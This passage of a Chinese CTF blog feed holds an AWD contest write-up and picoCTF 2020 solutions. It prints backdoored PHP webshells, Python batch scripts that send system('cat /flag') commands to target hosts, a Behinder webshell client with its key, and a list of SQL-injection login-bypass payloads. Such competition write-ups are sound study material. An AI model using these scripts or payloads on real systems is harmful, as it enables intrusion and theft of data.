class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;myblog&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;..&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">        &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;#&quot;&gt;Blog&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">            &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;笔记&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;关于&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;&lt;&#x2F;nav&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;panel panel-success&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-heading&quot;&gt;</span><br><span class="line">        &lt;h1 class&#x3D;&quot;panel-title&quot;&gt;php是世界上最好的语言&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-body&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;1&amp;topic&#x3D;Welcome to PHP world&#39;&gt;Welcome to PHP world&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;2&amp;topic&#x3D;Do the best you can&#39;&gt;Do the best you can&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;3&amp;topic&#x3D;Attention, please.&#39;&gt;格式化，全都格式化。。。&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--mysql_real_escape_string()--&gt;</span><br><span class="line">&lt;!--$topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);--&gt;</span><br><span class="line">&lt;!--$sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id)--&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>观察可得该网页的php部分有一明显洞，为POST传入一个名为x的变量.</p><blockquote><p>但需要注意的是，由于该部分返回的req.text不止flag部分，故需对获得的数据做进一步处理才行</p></blockquote><p><img src="DLn359.jpg" alt="notes"></p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_notes(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_notes.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[1][0:32]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure><h4><span id="7"><em>7</em></span></h4><h5><span id="ciscn_includephp"><strong>ciscn_include.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="linespan><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该处可通过冰蝎连接以及COOKIE传参一个名为cookie的变量’cookie=system(‘cat /flag’);'可得：</p><p>(1)冰蝎连接👇</p><p><img src="DLnJ81.jpg" alt="bx"></p><p>批量脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#冰蝎</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def padding_zero(key) -&gt; bytes:</span><br><span class="line">    output &#x3D; list(key)</span><br><span class="line">    while len(output) % 16:</span><br><span class="line">        output.append(&#39;\x00&#39;)</span><br><span class="line">    return &#39;&#39;.join(output).encode()</span><br><span class="line"></span><br><span class="line">def padding_pkcs5(msg) -&gt; bytes:</span><br><span class="line">    if isinstance(msg, str):</span><br><span class="line">        msg &#x3D; msg.encode()</span><br><span class="line">    if len(msg) &#x3D;&#x3D; 0x10:</span><br><span class="line">        return msg + b&#39;\x10&#39; * 0x10</span><br><span class="line">    return msg + (</span><br><span class="line">        0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()</span><br><span class="line"></span><br><span class="line">def aes_encrypt(msg, key) -&gt; str:</span><br><span class="line">    key&#x3D;padding_zero(key)</span><br><span class="line">    enc &#x3D; AES.new(key, AES.MODE_CBC, b&#39;\x00&#39; * 16)</span><br><span class="line">    return base64.b64encode(enc.encrypt(padding_pkcs5(msg))).decode()</span><br><span class="line"></span><br><span class="line">def get_key(url):</span><br><span class="line">    Getparams&#x3D;&#123;&quot;pass&quot;:&quot;1&quot;&#125;</span><br><span class="line">    key &#x3D; session.get(url,params&#x3D;Getparams).content</span><br><span class="line">    key &#x3D; str(key, encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    return key</span><br><span class="line"></span><br><span class="line">def main_exec(url,command,key):</span><br><span class="line">    command &#x3D; bytes(command, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line">    command_b64&#x3D; str(base64.b64encode(command), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def main_exec_encode(url,command,key):</span><br><span class="line">    command2 &#x3D; &quot;ob_start();&quot;+command+&quot;$flag &#x3D; ob_get_contents();ob_end_clean();for($i&#x3D;0;$i&lt;10;$i++)&#123;$flag&#x3D;bin2hex($flag);$flag&#x3D;base64_encode($flag);&#125;print($flag);&quot;</span><br><span class="line">    command2 &#x3D; bytes(command2, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line"></span><br><span class="line">    command_b64 &#x3D; str(base64.b64encode(command2), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line"></span><br><span class="line">    for i in range(10):</span><br><span class="line">        res &#x3D; base64.b64decode(res)</span><br><span class="line">        res &#x3D; codecs.decode(res,&quot;hex&quot;)</span><br><span class="line">        return res</span><br><span class="line">    </span><br><span class="line">def ciscn_include(i):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;XXX:&quot;+str(i)+&quot;&#x2F;blog&#x2F;ciscn_include.php&quot;</span><br><span class="line">    command &#x3D; &quot;system(&#39;cat &#x2F;flag&#39;);&quot;</span><br><span class="line">    key &#x3D; &quot;e45e329feb5d925b&quot;</span><br><span class="line">    flag &#x3D; main_exec(url,command,key)</span><br><span class="line">    #flag2 &#x3D; main_exec_encode(url,command,key)</span><br><span class="line">    #flag&#x3D;(flag_[2:-1])</span><br><span class="line">    print(flag)</span><br><span class="line">    #print(flag2)</span><br><span class="line">    </span><br><span class="line">#冰蝎end</span><br></pre></td></tr></table></figure><p>(2)COOKIE传参脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_include2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_include.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cookie&quot;:&quot;&#x2F;flag&quot;&#125;</span><br><span class="line">    req&#x3D;requests.get(url&#x3D;attack_url,cookies&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure><hr><h4><span id="8"><em>8</em></span></h4><h5><span id="ciscn_configphp"><strong>ciscn_config.php</strong></span></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Mysql閾炬帴閰嶇疆&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$con &#x3D; mysql_connect (&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;c933ccc3b6b2fe8cb830a5e76f5f98a5&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">  print(&#39;Could not connect: &#39; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(&quot;ciscn_web&quot;, $con);</span><br><span class="line"></span><br><span class="line">forward_static_call_array(assert,array($_POST[&quot;x&quot;]));</span><br><span class="line">class c</span><br><span class="line">&#123;</span><br><span class="line">        public $code &#x3D; null;</span><br><span class="line">        public $decode &#x3D; null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;       $this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">                $this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">                @Eval($this-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">new c();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第一个洞在这个部分：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">$this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">@Eval($this-&gt;decode);</span><br></pre></td></tr></table></figure><p>将一串字符串赋值给$this-&gt;code(可简单理解为一个变量);将该变量进行base64解码后，赋值给$this-&gt;decode;将此变量当作php代码执行。</p><p>因此，我们需要将此字符串进行base64解密，得’eval($_POST[pass]);’</p><p>此后操作与第一第二相同，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config1(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pass&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>第二个洞为POST传参一个名为x的参数：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;118.89.227.105:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure><hr><p>至此，以上为本人此次比赛找到的所有洞，收获颇多.</p><blockquote><p>1.隐藏在正常服务中的洞往往不容易被发现（废话）,简单删除后会因此失分，因此审代码是相当重要的能力。</p></blockquote><blockquote><p>2.提高速度，AWD往往是比手速，尽管在比赛当时笔者拿flag的方式相当弱智，但事后通过对批量化的学习以及应用加深了对此的体会。</p></blockquote><blockquote><p>3.继续努力。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;simple&quot;&gt;simple&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;启示：新收获，体会到了AWD的乐趣&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;尽管笔者还是很菜，但是事后学会写批量化脚本成功后，还是体会到了AWD的乐</summary>
      
    
    
    
    
    <category term="AWD" scheme="http://mklkx.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>picoCTF2020</title>
    <link href="http://mklkx.github.io/2021/03/22/picoCTF2020/"/>
    <id>http://mklkx.github.io/2021/03/22/picoCTF2020/</id>
    <published>2021-03-22T12:43:25.000Z</published>
    <updated>2021-05-04T11:39:01.031Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="forensics">Forensics</span></h2><hr><h3><span id="glory-of-the-garden"><em>Glory of the Garden</em></span></h3><blockquote><p><img src="DL3wl9.jpg" alt="DL3wl9"></p><blockquote><p>What is a hex editor?</p></blockquote></blockquote><p>根据hint，拖进winhex，最后可得flag.</p><p><em>shark on wire 1</em></p><blockquote><p><a href="https://play.picoctf.org/practice/challenge/30?category=4&amp;page=1">shark on wire 1</a></p><blockquote><p>Try using a tool like Wireshark;What are streams?</p></blockquote></blockquote><p>追踪UDP流，得flag。（MISC-AboutWireshark.md里编写了类似的思路）</p><h3><span id="extensions"></span></h3><blockquote><p>How do operating systems know what kind of file it is? (It’s not just the ending!Make sure to submit the flag as picoCTF{XXXXX}</p></blockquote><p>直接打开是一txt文件，观察可指为png的文件格式，更改后缀名可得flag.</p><h3><span id="so-meta"><em>So Meta</em></span></h3><blockquote><p><img src="DL3UW4.png" alt="So Meta"></p><blockquote><p>What does meta mean in the context of files?Ever heard of metadata?</p></blockquote></blockquote><p>同第一题，Winhex打开搜索关键词得flag.</p><h3><span id="what-lies-within"><em>What Lies Within</em></span></h3><blockquote><p><img src="DL3dSJ.png" alt="buildings"></p><blockquote><p>There is data encoded somewhere… there might be an online decoder.</p></blockquote></blockquote><p><a href="https://stylesuxx.github.io/steganography/">图片隐写</a>在线网站可得，工具get</p><h3><span id="whitepages"></span></h3><blockquote><p>I stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank!</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">text&#x3D;&#39;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                &#39;</span><br><span class="line">firstType &#x3D; &#39; &#39;</span><br><span class="line">secondType &#x3D;  &#39; &#39;</span><br><span class="line">binaryString &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for char in text: #Foreach char</span><br><span class="line">    if char &#x3D;&#x3D; firstType: #Check if it is the first type</span><br><span class="line">        binaryString +&#x3D; &#39;0&#39; #Mark it as 0</span><br><span class="line">    else:</span><br><span class="line">        binaryString +&#x3D; &#39;1&#39; #Mark it as 1</span><br><span class="line"></span><br><span class="line">print(binaryString) #Print result</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="m00nwalk2"><em>m00nwalk2</em></span></h3><blockquote><p><a href="http://MISC-audio.md">MISC-audio.md</a> 中有提及。</p></blockquote><h3><span id="like1000"><em>like1000</em></span></h3><blockquote><p>[like1000](This .tar file got tarred a lot.)</p><blockquote><p>Try and script this, it’ll save you a lot of time</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tarfile</span><br><span class="line">for i in range(1000,1,-1):</span><br><span class="line">    filename&#x3D;str(i)+&#39;.tar&#39;</span><br><span class="line">    tar&#x3D;tarfile.open(filename)</span><br><span class="line">    tar.extractall()</span><br><span class="line">    tar.close</span><br></pre></td></tr></table></figure><h3><span id="webnet0"><em>WebNet0</em></span></h3><p>学到一招，更新在（<a href="http://MISC-AboutWireshark.md">MISC-AboutWireshark.md</a> 中）</p><h2><span id="web-exploitation">Web Exploitation</span></h2><hr><h3><span id="insp3ct0r"></span></h3><blockquote><p>How do you inspect web code on a browser?There’s 3 parts</p></blockquote><p>ctrl+u看源码-&gt;1/3 of the flag: picoCTF{tru3_d3</p><p>mycss.css看源码-&gt; 2/3 of the flag: t3ct1ve_0r_ju5t</p><p>myjs.js看源码-&gt;3/3 of the flag: _lucky?2e7b23e3}</p><h3><span id="where-are-the-robots"></span></h3><blockquote><p>What part of the website could tell you where the creator doesn’t want you to look?</p></blockquote><p>提到robots,输入/robots.txt</p><p>得👇</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;1bb4c.html</span><br></pre></td></tr></table></figure><p>输入/1bb4c.html得flag.</p><h3><span id="dont-use-client-side"></span></h3><blockquote><p>Never trust the client</p></blockquote><p>看源码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function verify() &#123;</span><br><span class="line">    checkpass &#x3D; document.getElementById(&quot;pass&quot;).value;</span><br><span class="line">    split &#x3D; 4;</span><br><span class="line">    if (checkpass.substring(0, split) &#x3D;&#x3D; &#39;pico&#39;) &#123;</span><br><span class="line">      if (checkpass.substring(split*6, split*7) &#x3D;&#x3D; &#39;706c&#39;) &#123;</span><br><span class="line">        if (checkpass.substring(split, split*2) &#x3D;&#x3D; &#39;CTF&#123;&#39;) &#123;</span><br><span class="line">         if (checkpass.substring(split*4, split*5) &#x3D;&#x3D; &#39;ts_p&#39;) &#123;</span><br><span class="line">          if (checkpass.substring(split*3, split*4) &#x3D;&#x3D; &#39;lien&#39;) &#123;</span><br><span class="line">            if (checkpass.substring(split*5, split*6) &#x3D;&#x3D; &#39;lz_b&#39;) &#123;</span><br><span class="line">              if (checkpass.substring(split*2, split*3) &#x3D;&#x3D; &#39;no_c&#39;) &#123;</span><br><span class="line">                if (checkpass.substring(split*7, split*8) &#x3D;&#x3D; &#39;5&#125;&#39;) &#123;</span><br><span class="line">                  alert(&quot;Password Verified&quot;)</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">      </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      alert(&quot;Incorrect password&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>读代码，根据下标拼接flag。</p><h3><span id="logon"></span></h3><blockquote><p>Hmm it doesn’t seem to check anyone’s password, except for logon’s?</p></blockquote><p>根据提示，用logon登录后，什么都没有。但EditThisCookie中观察，多了admin的选项，将admin由False改为True后，加锁，加路径后，刷新即可得flag。👇</p><p><img src="DL3NYF.jpg" alt="logon"></p><h3><span id="client-side-again"></span></h3><blockquote><p>What is obfuscation?</p></blockquote><h3><span id="open-to-admins"></span></h3><blockquote><p>Can cookies help you to get the flag?</p></blockquote><p>了解了传COOKIES的另一种方式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;https:&#x2F;&#x2F;jupiter.challenges.picoctf.org&#x2F;problem&#x2F;51400&#x2F;&quot; -H &quot;Cookie:admin&#x3D;True;time&#x3D;1400;&quot; -s</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep picoCTF</span><br></pre></td></tr></table></figure><p>来搜索关键词。</p><h3><span id="picobrowser"></span></h3><blockquote><p>You don’t need to download a new web browser</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --user-agent &quot;picobrowser&quot; &quot;https:&#x2F;&#x2F;jupiter.challenges.picoctf.org&#x2F;problem&#x2F;13759&#x2F;flag&quot; | grep picoCTF</span><br></pre></td></tr></table></figure><p>得flag所在的那一行。</p><h3><span id="irish-name-repo-1"></span></h3><blockquote><p>There doesn’t seem to be many ways to interact with this. I wonder if the users are kept in a database?Try to think about how the website verifies your login.</p></blockquote><p>由这道题了解到了网络后台的万能密码，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;&#x3D;&quot;a</span><br><span class="line"></span><br><span class="line">&#39;)or(&#39;a&#39;&#x3D;&#39;a</span><br><span class="line"></span><br><span class="line">or 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">&#39;or 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">a&#39;or&#39; 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">&quot;or 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">&#39;or&#39;a&#39;&#x3D;&#39;a</span><br><span class="line"></span><br><span class="line">&quot;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a</span><br><span class="line"></span><br><span class="line">&#39;or&#39;&#39;&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">&#39;or&#39;&#x3D;&#39;or&#39;</span><br><span class="line"></span><br><span class="line">1 or &#39;1&#39;&#x3D;&#39;1&#39;&#x3D;1</span><br><span class="line"></span><br><span class="line">1 or &#39;1&#39;&#x3D;&#39;1&#39; or 1&#x3D;1</span><br><span class="line"></span><br><span class="line">&#39;OR 1&#x3D;1</span><br><span class="line"></span><br><span class="line">&quot;or 1&#x3D;1</span><br><span class="line"></span><br><span class="line">&#39;xor</span><br></pre></td></tr></table></figure><p>简单来说就是在自己需要传输的命令后添加一个恒为真的值来保证执行。学到了。由此可知该题可输入的命令为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;&amp;username&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1</span><br><span class="line">password: </span><br><span class="line">SQL query: SELECT * FROM users WHERE name&#x3D;&#39;admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1&#39; AND password&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><p>得到flag.</p><h3><span id="irish-name-repo-2"></span></h3><blockquote><p>The password is being filtered.</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;1&amp;username&#x3D;admin&#39;--</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: admin&#39;--</span><br><span class="line">password: 1</span><br><span class="line">SQL query: SELECT * FROM users WHERE name&#x3D;&#39;admin&#39;--&#39; AND password&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure><h3><span id="irish-name-repo-3"></span></h3><blockquote><p>Seems like the password is encrypted.</p></blockquote><p>尝试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;adsf</span><br></pre></td></tr></table></figure><p>发现回显</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password: adsf</span><br><span class="line">SQL query: SELECT * FROM admin where password &#x3D; &#39;nqfs&#39;</span><br></pre></td></tr></table></figure><p>与输入不同，可知该程序对输入值进行了某种加密。观察可得为ROT13解码，故我们可以通过ROT13加密的方式传入我们的命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;&#39; BE &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password: &#39; BE &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">SQL query: SELECT * FROM admin where password &#x3D; &#39;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure><p>得flag.</p><h2><span id="reverse-engineering">Reverse Engineering</span></h2><hr><h3><span id="vault-door-training"><em>vault-door-training</em></span></h3><blockquote><p>[vault-door-training](Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java)</p><blockquote><p>The password is revealed in the program’s source code.</p></blockquote></blockquote><p>读脚本即可解。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String input &#x3D; userInput.substring(&quot;picoCTF&#123;&quot;.length(),userInput.length()-1);</span><br><span class="line"></span><br><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        return password.equals(&quot;w4rm1ng_Up_w1tH_jAv4_3808d338b46&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="vault-door-1"><em>vault-door-1</em></span></h3><blockquote><p>[vault-door-1](This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java)</p><blockquote><p>Look up the charAt() method online.</p></blockquote></blockquote><p>根据数组下标依次串联可得flag。</p><h3><span id="vault-door-3"><em>vault-door-3</em></span></h3><blockquote><p>[vault-door-3](This vault uses for-loops and byte arrays. The source code for this vault is here: VaultDoor3.java)</p><blockquote><p>Make a table that contains each value of the loop variables and the corresponding buffer index that it writes to.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        if (password.length() !&#x3D; 32) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        char[] buffer &#x3D; new char[32];</span><br><span class="line">        int i;</span><br><span class="line">        for (i&#x3D;0; i&lt;8; i++) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        for (; i&lt;16; i++) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(23-i);</span><br><span class="line">        &#125;</span><br><span class="line">        for (; i&lt;32; i+&#x3D;2) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(46-i);</span><br><span class="line">        &#125;</span><br><span class="line">        for (i&#x3D;31; i&gt;&#x3D;17; i-&#x3D;2) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        String s &#x3D; new String(buffer);</span><br><span class="line">        return s.equals(&quot;jU5t_a_sna_3lpm12g94c_u_4_m7ra41&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>理解脚本逻辑，明确</p><p>-密文长度为32位</p><p>-依次取s中的对应位数</p><p>-串联得flag</p><h3><span id="vault-door-4"><em>vault-door-4</em></span></h3><blockquote><p>[vault-door-4](This vault uses ASCII encoding for the password. The source code for this vault is here: VaultDoor4.java)</p><blockquote><p>Use a search engine to find an “ASCII table”.You will also need to know the difference between octal, decimal, and hexadecimal numbers.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        byte[] passBytes &#x3D; password.getBytes();</span><br><span class="line">        byte[] myBytes &#x3D; &#123;</span><br><span class="line">            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,</span><br><span class="line">            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,</span><br><span class="line">            0142, 0131, 0164, 063 , 0163, 0137, 0146, 064 ,</span><br><span class="line">            &#39;a&#39; , &#39;8&#39; , &#39;c&#39; , &#39;d&#39; , &#39;8&#39; , &#39;f&#39; , &#39;7&#39; , &#39;e&#39; ,</span><br><span class="line">        &#125;;</span><br><span class="line">        for (int i&#x3D;0; i&lt;32; i++) &#123;</span><br><span class="line">            if (passBytes[i] !&#x3D; myBytes[i]) &#123;</span><br><span class="line">                return 